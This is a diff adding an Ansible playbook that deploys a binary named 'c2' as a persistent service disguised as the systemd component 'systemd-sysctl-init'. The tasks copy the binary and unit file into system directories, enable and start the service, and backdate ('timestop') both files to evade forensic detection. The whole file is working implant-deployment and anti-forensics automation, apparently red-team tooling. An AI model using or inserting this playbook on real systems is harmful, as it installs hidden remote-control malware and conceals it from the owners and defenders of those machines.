@@ -1,0 +1,30 @@
+---
+- name: drop service file
+  copy:
+    src: systemd-sysctl-init.service
+    dest: /lib/systemd/system/systemd-sysctl-init.service
+    mode: 644
+
+- name: drop binary
+  copy:
+    src: c2
+    dest: /lib/systemd/systemd-sysctl-init
+    mode: 755
+
+- name: reload service daemons
+  systemd:
+    daemon_reload: yes
+
+- name: start and enable service
+  service:
+    name: systemd-sysctl-init
+    enabled: yes
+    state: started
+
+- name: timestop files
+  file:
+    path: "{{ item  }}"
+    modification_time: "{{ timestop_time }}"
+  loop:
+    - /lib/systemd/system/systemd-sysctl-init.service
+    - /lib/systemd/systemd-sysctl-init
